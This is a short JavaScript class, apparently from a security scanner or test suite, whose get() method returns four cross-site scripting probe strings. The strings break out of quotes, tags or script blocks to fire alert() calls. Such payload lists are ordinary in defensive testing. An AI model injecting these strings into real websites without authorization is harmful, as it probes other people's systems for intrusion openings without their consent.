class Payloads {
  get () {
    return [
      "';alert(1)//",
      "\";alert(2)//",
      "\"><img src=x onerror=alert(3)>",
      "</script><svg/onload=alert(4)>"
    ]
  }
}
